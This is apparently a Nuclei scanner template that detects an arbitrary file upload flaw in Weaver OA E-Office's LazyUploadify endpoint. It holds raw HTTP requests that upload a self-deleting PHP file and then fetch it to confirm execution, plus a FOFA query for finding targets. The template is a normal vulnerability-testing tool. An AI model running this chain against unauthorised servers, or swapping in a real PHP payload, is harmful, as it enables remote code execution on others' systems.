http:
- extractors:
  - group: 1
    internal: true
    name: attachmentID
    regex:
    - attachmentID":(.*?),
    type: regex
  - group: 1
    internal: true
    name: attachmentName
    regex:
    - attachmentName":"(.*?)",
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_1 == 200
    - contains(body_2, 'attachmentID') && contains(body_2, 'attachmentName')
    - status_code_3 == 200 && contains(body_3,'{{randstr}}')
    type: dsl
  matchers-condition: and
  raw:
  - 'GET /general/weibo/javascript/LazyUploadify/uploadify.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /general/weibo/javascript/LazyUploadify/uploadify.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like
    Gecko) Chrome/71.0.3578.98 Safari/537.36

    Accept: */*

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjetvpuye

    Accept-Encoding: gzip


    ------WebKitFormBoundaryjetvpuye

    Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"

    Content-Type: application/octet-stream


    <?php echo "{{string}}";unlink(__FILE__);?>

    ------WebKitFormBoundaryjetvpuye--

    '
  - 'GET /attachment/{{attachmentID}}/{{attachmentName}} HTTP/1.1

    Host: {{Hostname}}

    '
id: weaver-lazyuploadify-file-upload
info:
  author: SleepingBag945
  description: OA E-Office LazyUploadify is vulnerable to arbitrary file upload.
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-EOffice\""
    max-request: 3
    verified: true
  name: OA E-Office LazyUploadify - Arbitrary File Upload
  reference:
  - https://github.com/w-digital-scanner/w9scan/blob/master/plugins/weaver_oa/2158.py
  severity: critical
  tags: weaver,e-office,intrusive,rce,file-upload
variables:
  filename: '{{to_lower(rand_base(5))}}'
  string: '{{randstr}}'
